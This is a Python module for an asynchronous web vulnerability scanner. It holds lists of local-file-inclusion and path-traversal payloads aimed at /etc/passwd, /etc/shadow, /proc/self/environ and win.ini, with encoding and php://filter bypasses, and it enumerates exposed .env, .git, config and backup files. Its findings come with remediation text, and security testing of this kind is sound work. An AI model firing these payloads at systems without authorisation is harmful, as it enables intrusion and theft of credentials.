#!/usr/bin/env python3
"""
URL Vulnerability Scanner Module
Comprehensive scanning for LFI, directory traversal, backup files, and more.
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set, Callable, Any
from enum import Enum
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode
import logging

try:
    from async_scanner import AsyncHTTPClient, RequestConfig, Response, RateLimitConfig
    ASYNC_AVAILABLE = True
except ImportError:
    ASYNC_AVAILABLE = False

logger = logging.getLogger(__name__)


class VulnSeverity(Enum):
    """Vulnerability severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnType(Enum):
    """Types of URL vulnerabilities."""
    LFI = "lfi"
    PATH_TRAVERSAL = "path_traversal"
    RFI = "rfi"
    DIRECTORY_LISTING = "directory_listing"
    BACKUP_FILE = "backup_file"
    CONFIG_EXPOSURE = "config_exposure"
    SENSITIVE_FILE = "sensitive_file"
    HIDDEN_DIRECTORY = "hidden_directory"
    DEBUG_ENDPOINT = "debug_endpoint"
    INFO_DISCLOSURE = "info_disclosure"


@dataclass
class URLVulnFinding:
    """Represents a URL vulnerability finding."""
    vuln_type: VulnType
    severity: VulnSeverity
    url: str
    payload: str
    evidence: str
    description: str
    remediation: str = ""
    confidence: str = "high"  # high, medium, low

    def to_dict(self) -> Dict:
        return {
            "vuln_type": self.vuln_type.value,
            "severity": self.severity.value,
            "url": self.url,
            "payload": self.payload,
            "evidence": self.evidence[:500] if self.evidence else "",
            "description": self.description,
            "remediation": self.remediation,
            "confidence": self.confidence,
        }


class LFIScanner:
    """
    Local File Inclusion (LFI) and Path Traversal Scanner.

    Tests for:
    - Basic path traversal (../)
    - Encoded path traversal (%2e%2e%2f)
    - Null byte injection
    - Filter bypass techniques
    - Windows and Linux paths
    """

    # LFI payloads for Linux
    LINUX_PAYLOADS = [
        # Basic traversal
        ("../../../etc/passwd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
        ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
        ("....\/....\/....\/etc/passwd", "root:"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:"),
        # Null byte (PHP < 5.3.4)
        ("../../../etc/passwd%00", "root:"),
        ("../../../etc/passwd\x00", "root:"),
        # Wrapper bypass
        ("php://filter/convert.base64-encode/resource=../../../etc/passwd", "cm9vd"),
        ("php://filter/read=string.rot13/resource=../../../etc/passwd", "ebbg:"),
        # Absolute path
        ("/etc/passwd", "root:"),
        ("file:///etc/passwd", "root:"),
        # Other sensitive files
        ("../../../etc/shadow", "root:"),
        ("../../../etc/hosts", "localhost"),
        ("../../../proc/self/environ", "PATH="),
        ("../../../proc/version", "Linux version"),
        ("../../../var/log/apache2/access.log", "GET /"),
        ("../../../var/log/nginx/access.log", "GET /"),
    ]

    # LFI payloads for Windows
    WINDOWS_PAYLOADS = [
        ("..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("....\\....\\....\\windows\\win.ini", "[fonts]"),
        ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]"),
        ("../../../windows/win.ini", "[fonts]"),
        ("C:\\windows\\win.ini", "[fonts]"),
        ("C:/windows/win.ini", "[fonts]"),
        ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "localhost"),
        ("../../../boot.ini", "[boot loader]"),
        ("..\\..\\..\\boot.ini", "[boot loader]"),
    ]

    # Common vulnerable parameters
    VULN_PARAMS = [
        "file", "path", "filepath", "page", "include", "doc", "document",
        "folder", "root", "pg", "style", "pdf", "template", "php_path",
        "mod", "conf", "type", "view", "content", "layout", "read",
        "download", "cat", "action", "board", "date", "detail", "dir",
        "name", "lang", "display", "load", "url",
    ]

    def __init__(self, client: Optional[AsyncHTTPClient] = None, timeout: float = 10.0):
        self.client = client
        self.timeout = timeout
        self._own_client = False

    async def _ensure_client(self):
        if self.client is None and ASYNC_AVAILABLE:
            rate_config = RateLimitConfig(requests_per_second=20, burst_size=10)
            self.client = AsyncHTTPClient(rate_config=rate_config)
            self._own_client = True

    async def close(self):
        if self._own_client and self.client:
            await self.client.close()

    async def scan_url(self, url: str) -> List[URLVulnFinding]:
        """Scan a single URL for LFI vulnerabilities."""
        await self._ensure_client()
        findings = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Test existing parameters
        for param in params:
            if param.lower() in self.VULN_PARAMS or params:
                findings.extend(await self._test_parameter(url, param))

        # Test with injected vulnerable parameters
        if not params:
            for param in self.VULN_PARAMS[:5]:  # Test top 5 params
                test_url = f"{url}?{param}=test"
                findings.extend(await self._test_parameter(test_url, param))

        return findings

    async def _test_parameter(self, url: str, param: str) -> List[URLVulnFinding]:
        """Test a specific parameter for LFI."""
        findings = []

        # Combine payloads
        all_payloads = self.LINUX_PAYLOADS + self.WINDOWS_PAYLOADS

        for payload, indicator in all_payloads:
            try:
                # Build test URL
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                config = RequestConfig(
                    url=test_url,
                    method="GET",
                    timeout=self.timeout,
                    follow_redirects=False,
                )

                response = await self.client.request(config)

                if response.error:
                    continue

                # Check for indicator in response
                if indicator.lower() in response.body.lower():
                    # Determine if it's Windows or Linux
                    is_windows = "win.ini" in payload or "boot.ini" in payload

                    findings.append(URLVulnFinding(
                        vuln_type=VulnType.LFI,
                        severity=VulnSeverity.CRITICAL if "passwd" in payload or "shadow" in payload else VulnSeverity.HIGH,
                        url=url,
                        payload=f"{param}={payload}",
                        evidence=response.body[:200],
                        description=f"Local File Inclusion vulnerability found in parameter '{param}'. "
                                    f"{'Windows' if is_windows else 'Linux'} system files are accessible.",
                        remediation="Validate and sanitize file path inputs. Use allowlists for file access. "
                                    "Avoid passing user input directly to file functions.",
                        confidence="high",
                    ))
                    break  # Found LFI, no need to test more payloads

            except Exception as e:
                logger.debug(f"LFI test error: {e}")
                continue

        return findings


class DirectoryScanner:
    """
    Directory and File Enumeration Scanner.

    Discovers:
    - Hidden directories
    - Backup files
    - Configuration files
    - Debug endpoints
    - Sensitive files
    """

    # Common directories to check
    COMMON_DIRS = [
        # Admin/Backend
        "admin", "administrator", "admin.php", "admin.html", "adminpanel",
        "backend", "manage", "management", "manager", "control", "cpanel",
        "wp-admin", "wp-login.php", "dashboard", "panel",
        # Config/Settings
        "config", "configuration", "settings", "setup", "install",
        "conf", "cfg", "env", ".env", "config.php", "settings.php",
        # Backup/Archive
        "backup", "backups", "bak", "old", "archive", "temp", "tmp",
        "dump", "sql", "db", "database",
        # Development
        "dev", "development", "staging", "test", "testing", "debug",
        "demo", "sandbox", "beta", "alpha",
        # API/Docs
        "api", "api/v1", "api/v2", "rest", "graphql", "swagger",
        "docs", "documentation", "doc", "apidocs", "api-docs",
        # Source/Git
        ".git", ".git/config", ".git/HEAD", ".svn", ".svn/entries",
        ".hg", ".bzr", "CVS",
        # Server files
        "server-status", "server-info", ".htaccess", ".htpasswd",
        "web.config", "crossdomain.xml", "clientaccesspolicy.xml",
        "robots.txt", "sitemap.xml", "humans.txt",
        # Common files
        "readme", "readme.txt", "README.md", "CHANGELOG", "LICENSE",
        "package.json", "composer.json", "Gemfile", "requirements.txt",
        # Error/Log
        "error", "errors", "error_log", "error.log", "debug.log",
        "logs", "log", "access.log",
        # Upload
        "upload", "uploads", "files", "images", "media", "assets",
        "static", "public", "private",
        # PHP specific
        "phpinfo.php", "info.php", "test.php", "i.php", "php.php",
        "phpMyAdmin", "phpmyadmin", "pma", "myadmin",
        # Java/Spring
        "actuator", "actuator/health", "actuator/env", "actuator/mappings",
        "console", "h2-console", "jolokia",
        # Node.js
        "node_modules", ".npm", "npm-debug.log",
        # Other
        "cgi-bin", "bin", "includes", "inc", "lib", "src", "app",
    ]

    # Backup file extensions
    BACKUP_EXTENSIONS = [
        ".bak", ".backup", ".old", ".orig", ".original", ".save",
        ".swp", ".swo", "~", ".tmp", ".temp", ".copy",
        ".1", ".2", "_backup", "-backup", "_old", "-old",
        ".sql", ".sql.gz", ".sql.bz2", ".tar", ".tar.gz", ".zip",
        ".rar", ".7z", ".gz", ".bz2",
    ]

    # Config file patterns
    CONFIG_FILES = [
        "config.php", "config.inc.php", "config.yaml", "config.yml",
        "config.json", "config.xml", "config.ini", "config.js",
        "settings.php", "settings.py", "settings.json",
        "database.php", "database.yml", "db.php", "db.conf",
        "wp-config.php", "wp-config.php.bak", "wp-config.php.old",
        "configuration.php", "LocalSettings.php", "parameters.yml",
        ".env", ".env.local", ".env.production", ".env.development",
        ".env.backup", ".env.bak", ".env.old",
        "application.properties", "application.yml", "application.yaml",
        "secrets.json", "credentials.json", "auth.json",
    ]

    # Directory listing indicators
    DIR_LISTING_INDICATORS = [
        "Index of /", "Directory listing for", "<title>Index of",
        "Parent Directory", "[DIR]", "Name</a>", "Last modified</a>",
        "Directory Listing", "Apache Server at",
    ]

    def __init__(self, client: Optional[AsyncHTTPClient] = None, timeout: float = 10.0):
        self.client = client
        self.timeout = timeout
        self._own_client = False

    async def _ensure_client(self):
        if self.client is None and ASYNC_AVAILABLE:
            rate_config = RateLimitConfig(requests_per_second=30, burst_size=15)
            self.client = AsyncHTTPClient(rate_config=rate_config)
            self._own_client = True

    async def close(self):
        if self._own_client and self.client:
            await self.client.close()

    async def scan_url(
        self,
        base_url: str,
        check_dirs: bool = True,
        check_backups: bool = True,
        check_configs: bool = True,
        progress_callback: Optional[Callable[[int, int], None]] = None,
    ) -> List[URLVulnFinding]:
        """Scan a URL for directories and files."""
        await self._ensure_client()
        findings = []

        # Ensure base URL ends properly
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        paths_to_check = []

        if check_dirs:
            paths_to_check.extend(self.COMMON_DIRS)

        if check_configs:
            paths_to_check.extend(self.CONFIG_FILES)

        if check_backups:
            # Add backup versions of common files
            for ext in self.BACKUP_EXTENSIONS[:5]:  # Limit extensions
                paths_to_check.extend([
                    f"index.php{ext}", f"index.html{ext}",
                    f"config.php{ext}", f"settings.php{ext}",
                ])

        total = len(paths_to_check)
        completed = 0

        # Batch requests for efficiency
        batch_size = 20
        for i in range(0, len(paths_to_check), batch_size):
            batch = paths_to_check[i:i + batch_size]

            tasks = []
            for path in batch:
                url = urljoin(base + "/", path)
                tasks.append(self._check_path(url, path))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in results:
                if isinstance(result, list):
                    findings.extend(result)

            completed += len(batch)
            if progress_callback:
                progress_callback(completed, total)

        return findings

    async def _check_path(self, url: str, path: str) -> List[URLVulnFinding]:
        """Check a single path for interesting content."""
        findings = []

        try:
            config = RequestConfig(
                url=url,
                method="GET",
                timeout=self.timeout,
                follow_redirects=False,
            )

            response = await self.client.request(config)

            if response.error:
                return findings

            # Skip 404s and common error pages
            if response.status == 404:
                return findings

            # Check for directory listing
            if response.status == 200:
                for indicator in self.DIR_LISTING_INDICATORS:
                    if indicator.lower() in response.body.lower():
                        findings.append(URLVulnFinding(
                            vuln_type=VulnType.DIRECTORY_LISTING,
                            severity=VulnSeverity.MEDIUM,
                            url=url,
                            payload=path,
                            evidence=response.body[:300],
                            description=f"Directory listing enabled at '{path}'",
                            remediation="Disable directory listing in web server configuration.",
                        ))
                        break

            # Only report actual accessible content (200 status)
            if response.status == 200:
                finding = self._classify_finding(url, path, response)
                if finding:
                    findings.append(finding)

            # Skip redirects - they don't indicate vulnerability
            # A redirect could be: login redirect, homepage redirect, 404 handler, etc.
            # This was causing many false positives

            # Skip 403 - this is GOOD security (access denied)
            # Only report 403 if we can confirm sensitive content exists

        except Exception as e:
            logger.debug(f"Directory check error for {url}: {e}")

        return findings

    def _classify_finding(
        self,
        url: str,
        path: str,
        response: Response
    ) -> Optional[URLVulnFinding]:
        """Classify a successful response into finding type."""

        path_lower = path.lower()
        body_lower = response.body.lower() if response.body else ""

        # Git exposure (critical)
        if ".git" in path_lower:
            if "ref:" in body_lower or "[core]" in body_lower or "repositoryformatversion" in body_lower:
                return URLVulnFinding(
                    vuln_type=VulnType.SENSITIVE_FILE,
                    severity=VulnSeverity.CRITICAL,
                    url=url,
                    payload=path,
                    evidence=response.body[:300],
                    description="Git repository exposed! Source code can be downloaded.",
                    remediation="Remove .git directory from web root or block access via web server.",
                )

        # Environment file (critical)
        if ".env" in path_lower:
            if "=" in response.body and any(k in body_lower for k in ["password", "secret", "key", "token", "db_"]):
                return URLVulnFinding(
                    vuln_type=VulnType.CONFIG_EXPOSURE,
                    severity=VulnSeverity.CRITICAL,
                    url=url,
                    payload=path,
                    evidence=response.body[:300],
                    description="Environment file exposed with potential credentials!",
                    remediation="Remove .env file from web root. Never commit .env to version control.",
                )

        # Config files (high)
        if any(cfg in path_lower for cfg in ["config", "settings", "database", "credentials"]):
            if any(k in body_lower for k in ["password", "secret", "apikey", "api_key", "db_pass"]):
                return URLVulnFinding(
                    vuln_type=VulnType.CONFIG_EXPOSURE,
                    severity=VulnSeverity.HIGH,
                    url=url,
                    payload=path,
                    evidence=response.body[:300],
                    description=f"Configuration file '{path}' exposed with sensitive data",
                    remediation="Move config files outside web root or restrict access.",
                )

        # Backup files (high)
        if any(ext in path_lower for ext in self.BACKUP_EXTENSIONS):
            return URLVulnFinding(
                vuln_type=VulnType.BACKUP_FILE,
                severity=VulnSeverity.HIGH,
                url=url,
                payload=path,
                evidence=f"File exists ({len(response.body)} bytes)",
                description=f"Backup file '{path}' is publicly accessible",
                remediation="Remove backup files from web-accessible directories.",
            )

        # PHP info (medium)
        if "phpinfo" in path_lower and "php version" in body_lower:
            return URLVulnFinding(
                vuln_type=VulnType.INFO_DISCLOSURE,
                severity=VulnSeverity.MEDIUM,
                url=url,
                payload=path,
                evidence="PHP configuration exposed",
                description="PHPInfo page exposes server configuration details",
                remediation="Remove phpinfo files from production servers.",
            )

        # Debug endpoints (medium-high)
        if any(d in path_lower for d in ["debug", "actuator", "console", "test"]):
            return URLVulnFinding(
                vuln_type=VulnType.DEBUG_ENDPOINT,
                severity=VulnSeverity.MEDIUM,
                url=url,
                payload=path,
                evidence=response.body[:200],
                description=f"Debug/development endpoint '{path}' is accessible",
                remediation="Disable debug endpoints in production.",
            )

        # Admin panels (medium)
        if any(a in path_lower for a in ["admin", "manager", "dashboard", "cpanel"]):
            if response.status == 200 and len(response.body) > 100:
                return URLVulnFinding(
                    vuln_type=VulnType.HIDDEN_DIRECTORY,
                    severity=VulnSeverity.MEDIUM,
                    url=url,
                    payload=path,
                    evidence=f"Admin panel accessible (HTTP {response.status})",
                    description=f"Admin interface found at '{path}'",
                    remediation="Restrict admin access by IP or add additional authentication.",
                    confidence="medium",
                )

        # Robots.txt / sitemap (info)
        if path_lower in ["robots.txt", "sitemap.xml"]:
            if "disallow" in body_lower or "urlset" in body_lower:
                return URLVulnFinding(
                    vuln_type=VulnType.INFO_DISCLOSURE,
                    severity=VulnSeverity.INFO,
                    url=url,
                    payload=path,
                    evidence=response.body[:500],
                    description=f"'{path}' found - may reveal hidden paths",
                    remediation="Review for sensitive paths being disclosed.",
                    confidence="high",
                )

        return None


class URLVulnScanner:
    """
    Unified URL Vulnerability Scanner.
    Coordinates LFI, directory enumeration, and other checks.
    """

    def __init__(
        self,
        client: Optional[AsyncHTTPClient] = None,
        timeout: float = 10.0,
        callback: Optional[Callable[[URLVulnFinding], None]] = None,
        progress_callback: Optional[Callable[[str, int, int], None]] = None,
    ):
        self.client = client
        self.timeout = timeout
        self.callback = callback
        self.progress_callback = progress_callback
        self._own_client = False

        self.lfi_scanner: Optional[LFIScanner] = None
        self.dir_scanner: Optional[DirectoryScanner] = None

    async def _ensure_client(self):
        if self.client is None and ASYNC_AVAILABLE:
            rate_config = RateLimitConfig(requests_per_second=30, burst_size=15)
            self.client = AsyncHTTPClient(rate_config=rate_config)
            self._own_client = True

        if self.lfi_scanner is None:
            self.lfi_scanner = LFIScanner(self.client, self.timeout)
        if self.dir_scanner is None:
            self.dir_scanner = DirectoryScanner(self.client, self.timeout)

    async def close(self):
        if self._own_client and self.client:
            await self.client.close()

    async def scan(
        self,
        urls: List[str],
        check_lfi: bool = True,
        check_dirs: bool = True,
        check_backups: bool = True,
        check_configs: bool = True,
        concurrency: int = 5,
    ) -> Dict[str, List[URLVulnFinding]]:
        """
        Scan multiple URLs for vulnerabilities.

        Args:
            urls: List of URLs to scan
            check_lfi: Enable LFI/path traversal checks
            check_dirs: Enable directory enumeration
            check_backups: Enable backup file discovery
            check_configs: Enable config file exposure checks
            concurrency: Max concurrent scans

        Returns:
            Dict mapping URL to findings
        """
        await self._ensure_client()

        results = {}
        semaphore = asyncio.Semaphore(concurrency)
        total = len(urls)
        completed = 0

        async def scan_one(url: str) -> tuple:
            nonlocal completed
            async with semaphore:
                findings = []

                try:
                    # LFI checks
                    if check_lfi:
                        if self.progress_callback:
                            self.progress_callback("LFI", completed, total)
                        lfi_findings = await self.lfi_scanner.scan_url(url)
                        findings.extend(lfi_findings)
                        for f in lfi_findings:
                            if self.callback:
                                self.callback(f)

                    # Directory enumeration
                    if check_dirs or check_backups or check_configs:
                        if self.progress_callback:
                            self.progress_callback("Directory", completed, total)
                        dir_findings = await self.dir_scanner.scan_url(
                            url,
                            check_dirs=check_dirs,
                            check_backups=check_backups,
                            check_configs=check_configs,
                        )
                        findings.extend(dir_findings)
                        for f in dir_findings:
                            if self.callback:
                                self.callback(f)

                except Exception as e:
                    logger.error(f"Error scanning {url}: {e}")

                completed += 1
                if self.progress_callback:
                    self.progress_callback("Scanning", completed, total)

                return (url, findings)

        tasks = [scan_one(url) for url in urls]
        scan_results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in scan_results:
            if isinstance(result, tuple):
                url, findings = result
                if findings:
                    results[url] = findings

        return results


# Synchronous wrapper for CLI usage
def run_url_vuln_scan(
    urls: List[str],
    check_lfi: bool = True,
    check_dirs: bool = True,
    check_backups: bool = True,
    check_configs: bool = True,
    callback: Optional[Callable[[URLVulnFinding], None]] = None,
) -> Dict[str, List[Dict]]:
    """
    Synchronous wrapper for URL vulnerability scanning.

    Args:
        urls: List of URLs to scan
        check_lfi: Enable LFI checks
        check_dirs: Enable directory enumeration
        check_backups: Enable backup file checks
        check_configs: Enable config exposure checks
        callback: Called for each finding

    Returns:
        Dict mapping URL to list of finding dicts
    """

    async def _scan():
        scanner = URLVulnScanner(callback=callback)
        try:
            results = await scanner.scan(
                urls,
                check_lfi=check_lfi,
                check_dirs=check_dirs,
                check_backups=check_backups,
                check_configs=check_configs,
            )
            return {
                url: [f.to_dict() for f in findings]
                for url, findings in results.items()
            }
        finally:
            await scanner.close()

    return asyncio.run(_scan())


if __name__ == "__main__":
    import sys

    async def main():
        print("[*] URL Vulnerability Scanner Test")
        print("=" * 50)

        # Test URL (use argument or default)
        test_url = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"

        def on_finding(finding: URLVulnFinding):
            severity_colors = {
                VulnSeverity.CRITICAL: "\033[91m",
                VulnSeverity.HIGH: "\033[93m",
                VulnSeverity.MEDIUM: "\033[94m",
                VulnSeverity.LOW: "\033[92m",
                VulnSeverity.INFO: "\033[96m",
            }
            reset = "\033[0m"
            color = severity_colors.get(finding.severity, "")
            print(f"{color}[{finding.severity.value.upper()}]{reset} {finding.vuln_type.value}")
            print(f"  URL: {finding.url}")
            print(f"  Payload: {finding.payload}")
            print(f"  Description: {finding.description}")
            print()

        def on_progress(check: str, current: int, total: int):
            print(f"  [{check}] {current}/{total}", end="\r")

        scanner = URLVulnScanner(callback=on_finding, progress_callback=on_progress)

        try:
            print(f"\n[*] Scanning: {test_url}\n")
            results = await scanner.scan(
                [test_url],
                check_lfi=True,
                check_dirs=True,
                check_backups=True,
                check_configs=True,
            )

            total_findings = sum(len(f) for f in results.values())
            print(f"\n[+] Scan complete: {total_findings} findings")

        finally:
            await scanner.close()

    asyncio.run(main())
